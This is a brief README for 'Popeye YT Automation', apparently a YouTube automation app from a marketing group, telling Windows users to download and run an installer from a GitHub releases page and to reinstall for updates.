# Popeye YT Automation

Popeye YT Automation by popeye marketing.

## Installation

### Windows
1. Download the latest **`.exe`** installer from the [Releases page](https://github.com/digi-bulk-marketing/6aa2cb079bc817193fce0665/releases/latest).
2. Run the installer and follow the prompts.
3. Launch **Popeye YT Automation** from the Start menu.

## Updates

Download the newest installer from the [Releases page](https://github.com/digi-bulk-marketing/6aa2cb079bc817193fce0665/releases/latest) and reinstall.
